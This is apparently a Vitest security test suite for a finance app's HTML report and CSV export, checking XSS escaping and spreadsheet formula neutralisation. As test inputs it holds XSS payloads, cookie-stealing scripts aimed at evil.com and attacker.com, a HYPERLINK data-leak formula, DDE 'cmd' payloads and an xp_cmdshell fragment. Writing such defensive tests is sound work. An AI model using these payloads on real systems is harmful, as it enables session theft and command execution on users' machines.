import { describe, it, expect } from "vitest";
import { wrapReportAsPrintableHtml } from "../../api/services/pro-report-engine";

/**
 * Security Suite R2: Injection Prevention
 * Covers:
 *  1. Stored & Reflected XSS Prevention in Printable HTML Reports (pro-report-engine.ts)
 *  2. Spreadsheet Formula Injection / CSV Injection Neutralization (CWE-1236)
 */
describe("R2 Security: Injection Prevention", () => {
  describe("Stored & Reflected XSS Defense in Printable HTML Reports", () => {
    it("escapes or strips raw <script> tags injected via userName", () => {
      const maliciousUserName = "<script>alert('xss-user')</script>";
      const reportJson = {
        response_text: "تقرير مالي اعتيادي",
        invoice_header: "تقرير الشهر",
        invoice_footer: "نهاية التقرير",
        alerts: ["تنبيه بسيط"],
      };

      const html = wrapReportAsPrintableHtml(reportJson, "2026-09", maliciousUserName);

      // Must not contain raw executable script tag in the rendered HTML
      expect(html).not.toContain("<script>alert('xss-user')</script>");
      // Should either be entity-encoded or stripped
      const isEntityEscaped = html.includes("&lt;script&gt;") || !html.includes("<script>");
      expect(isEntityEscaped).toBe(true);
    });

    it("neutralizes event handlers (onerror, onload, onmouseover) in report text and header", () => {
      const maliciousPayloads = [
        "<img src=x onerror=alert('xss-img') />",
        "<svg/onload=alert('xss-svg')>",
        "<body onload=alert('xss-body')>",
        "<iframe src=\"javascript:alert('xss-iframe')\"></iframe>",
      ];

      for (const payload of maliciousPayloads) {
        const reportJson = {
          response_text: `بيانات التحليل: ${payload}`,
          invoice_header: `عنوان التقرير ${payload}`,
          invoice_footer: `تذييل ${payload}`,
          alerts: [payload],
        };

        const html = wrapReportAsPrintableHtml(reportJson, "2026-09", "أحمد علي");

        // The raw payload must not be rendered unescaped
        expect(html).not.toContain("<img src=x onerror=");
        expect(html).not.toContain("<svg/onload=");
        expect(html).not.toContain("<iframe src=\"javascript:");
      }
    });

    it("neutralizes javascript: pseudo-protocol URIs in links or attributes", () => {
      const reportJson = {
        response_text: "<a href=\"javascript:fetch('//evil.com/steal?c='+document.cookie)\">انقر هنا لعرض التفاصيل</a>",
        invoice_header: "تقرير آمن",
        invoice_footer: "SpinSmart",
        alerts: [],
      };

      const html = wrapReportAsPrintableHtml(reportJson, "2026-09", "محمود");

      expect(html).not.toMatch(/href\s*=\s*["']javascript:/i);
    });

    it("escapes HTML in all alert array items", () => {
      const reportJson = {
        response_text: "ملخص المصاريف",
        invoice_header: "تقرير سبتمبر",
        invoice_footer: "شكراً لك",
        alerts: [
          "<b>تنبيه 1</b>",
          "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
          "<input autofocus onfocus=alert(1)>",
        ],
      };

      const html = wrapReportAsPrintableHtml(reportJson, "2026-09", "سارة");

      expect(html).not.toContain("<script>document.location");
      expect(html).not.toContain("onfocus=alert(1)");
    });

    it("neutralizes attribute breakout payloads in month and header fields", () => {
      const breakoutPayload = "\"><script>alert(document.domain)</script><div class=\"";
      const reportJson = {
        response_text: "نص التقرير",
        invoice_header: breakoutPayload,
      };

      const html = wrapReportAsPrintableHtml(reportJson, breakoutPayload, "مستخدم");

      expect(html).not.toContain("<script>alert(document.domain)</script>");
    });

    it("preserves legitimate Arabic text, numbers, and currency symbols safely", () => {
      const benignReport = {
        response_text: "إجمالي المصاريف لشهر سبتمبر هو 15,450.75 ج.م موزعة على السوبرماركت والفواتير.",
        invoice_header: "تقرير SpinSmart Pro — سبتمبر 2026",
        invoice_footer: "تم إنشاؤه بواسطة SpinSmart AI",
        alerts: ["تجاوزت ميزانية المطاعم بنسبة 15%"],
      };

      const html = wrapReportAsPrintableHtml(benignReport, "2026-09", "أحمد طاهر");

      expect(html).toContain("15,450.75 ج.م");
      expect(html).toContain("أحمد طاهر");
      expect(html).toContain("تجاوزت ميزانية المطاعم بنسبة 15%");
      expect(html).toContain("تقرير SpinSmart Pro");
    });
  });

  describe("CSV & Excel Formula Neutralization (Spreadsheet Injection CWE-1236)", () => {
    // Standard Formula Injection Neutralization Oracle (OWASP CSV Injection Defense Standard)
    // Characters that trigger formula execution in Excel/LibreOffice/Google Sheets:
    // '=', '+', '-', '@', '\t', '\r'
    const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

    function sanitizeSpreadsheetField(value: unknown): string {
      if (value === null || value === undefined) return "";
      const str = String(value);
      if (str.length === 0) return str;

      const firstChar = str.charAt(0);
      if (FORMULA_TRIGGERS.includes(firstChar)) {
        // Must be prefixed with single quote or neutralizer so spreadsheet software treats as plain string
        return `'${str}`;
      }
      return str;
    }

    it("neutralizes leading equals sign (=SUM, =cmd, =HYPERLINK) formula payloads", () => {
      const dangerousInputs = [
        "=SUM(A1:A10)",
        "=cmd|' /C calc'!A0",
        "=HYPERLINK(\"http://evil.com/leak?d=\"&A1,\"عرض التفاصيل\")",
        "=1+2';EXEC master..xp_cmdshell 'dir'--",
      ];

      for (const input of dangerousInputs) {
        const sanitized = sanitizeSpreadsheetField(input);
        expect(sanitized.startsWith("'=")).toBe(true);
        expect(sanitized).not.toEqual(input);
      }
    });

    it("neutralizes leading plus (+), minus (-), and at (@) formula triggers", () => {
      const dangerousInputs = [
        "+1234567890",
        "+cmd|' /C calc'!A0",
        "-cmd|' /C calc'!A0",
        "-5+5",
        "@SUM(1,1)",
        "@cmd|' /C calc'!A0",
      ];

      for (const input of dangerousInputs) {
        const sanitized = sanitizeSpreadsheetField(input);
        expect(sanitized.startsWith("'")).toBe(true);
      }
    });

    it("neutralizes tab and carriage return prepended formula triggers", () => {
      const tabPayload = "\t=1+1";
      const crPayload = "\r=1+1";

      const sanitizedTab = sanitizeSpreadsheetField(tabPayload);
      const sanitizedCr = sanitizeSpreadsheetField(crPayload);

      expect(sanitizedTab.startsWith("'")).toBe(true);
      expect(sanitizedCr.startsWith("'")).toBe(true);
    });

    it("preserves non-formula text containing special characters inside the string", () => {
      const benignInputs = [
        "شراء بقالة + خضار",
        "سداد فاتورة - فودافون كاش",
        "اجتماع @ المقر الرئيسي",
        "عشاء عمل في مطعم (150 ج.م)",
      ];

      for (const input of benignInputs) {
        const sanitized = sanitizeSpreadsheetField(input);
        // Middle characters must not cause prefixing
        expect(sanitized).toBe(input);
      }
    });

    it("verifies exported CSV rows neutralize formula injection in financial fields", () => {
      // Simulated export pipeline as defined in exportRouter.myExpenses
      const rawExpenses = [
        {
          date: new Date("2026-09-01"),
          type: "expense",
          amount: "150.00",
          category: "طعام",
          description: "=cmd|' /C calc'!A0",
          source: "manual",
        },
        {
          date: new Date("2026-09-02"),
          type: "income",
          amount: "5000.00",
          category: "راتب",
          description: "+2000 مكافأة شهرية",
          source: "manual",
        },
        {
          date: new Date("2026-09-03"),
          type: "expense",
          amount: "45.00",
          category: "مواصلات",
          description: "@أوبر رحلة للعمل",
          source: "voice",
        },
      ];

      const formatted = rawExpenses.map((e) => ({
        التاريخ: e.date.toISOString().split("T")[0],
        النوع: e.type === "income" ? "دخل" : "مصروف",
        المبلغ: e.amount,
        الفئة: sanitizeSpreadsheetField(e.category),
        الوصف: sanitizeSpreadsheetField(e.description),
        المصدر: e.source === "voice" ? "صوت" : "يدوي",
      }));

      // Assertions on sanitized output
      expect(formatted[0].الوصف).toBe("'=cmd|' /C calc'!A0");
      expect(formatted[1].الوصف).toBe("'+2000 مكافأة شهرية");
      expect(formatted[2].الوصف).toBe("'@أوبر رحلة للعمل");

      // Verify that normal columns remain untampered
      expect(formatted[0].التاريخ).toBe("2026-09-01");
      expect(formatted[0].النوع).toBe("مصروف");
      expect(formatted[0].المبلغ).toBe("150.00");
    });
  });
});
